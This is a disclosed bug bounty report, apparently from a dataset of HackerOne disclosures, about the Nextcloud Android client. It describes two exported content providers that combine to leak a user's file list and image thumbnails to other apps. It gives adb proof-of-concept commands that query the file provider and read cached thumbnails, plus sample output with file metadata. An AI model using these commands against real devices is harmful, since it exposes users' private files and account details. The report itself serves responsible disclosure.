---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '534541'
original_report_id: '534541'
title: Combination of content provider allows private data disclosure
weakness: Improper Access Control - Generic
team_handle: nextcloud
created_at: '2019-04-10T15:16:55.869Z'
disclosed_at: '2019-07-26T07:44:51.021Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 13
asset_identifier: com.nextcloud.client
asset_type: GOOGLE_PLAY_APP_ID
max_severity: medium
tags:
- hackerone
- improper-access-control-generic
---

# Combination of content provider allows private data disclosure

## Metadata

- HackerOne Report ID: 534541
- Weakness: Improper Access Control - Generic
- Program: nextcloud
- Disclosed At: 2019-07-26T07:44:51.021Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Good afternoon.

Sorry, its me again .. I use NC on a daily basis so I often makes some checks ..

As per #489105, document thumbnail shall not be disclosed. The exposure on thumbnailCache/ is an already know issue.  However, malicious apps are still able to extract (at least) pictures and text files by combining two content provider results.

As discussed in #518669, file status is exposed. This allow basically any app to retreive NC storage file structures. The  following endpoint is the relevant one for current issue:
```adb shell content query --uri content://org.nextcloud/file ```

which output for instance
```Row: 1 _id=7, filename=1553357105332.jpg, encrypted_filename=NULL, path=/1553357105332.jpg, parent=1, created=0, modified=1553357105000, content_type=image/jpeg, content_length=1275, media_path=, file_owner=julien_contacts@cloud.local.yourosoft.com, last_sync_date=1554908710211, keep_in_sync=NULL, last_sync_date_for_data=1554908492289, modified_at_last_sync_for_data=1553357105000, etag=1181bc97f9637dc926b9a5eddd618c7b, share_by_link=0, public_link=, permissions=RGDNVW, remote_id=00087789oc2tsz873825, update_thumbnail=0, is_downloading=0, favorite=0, is_encrypted=0, etag_in_conflict=NULL, shared_via_users=0, mount_type=0, has_preview=1, unread_comments_count=0, etag_on_server=1181bc97f9637dc926b9a5eddd618c7b, owner_id=julien_contacts, owner_display_name=Julien (Contact sync), note=
```

By using the output from this content provider query, it is possible to force the DiskLruImageCacheFileProvider content provider to generate thumbnail of the assets
adb shell content read --uri content://org.nextcloud.imageCache.provider/1553357105332.jpg

## Impact

User data is exposed to partial  disclosure (thumbnail).

As far as I understand, DiskLruImageCacheFileProvider shall not be exported

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
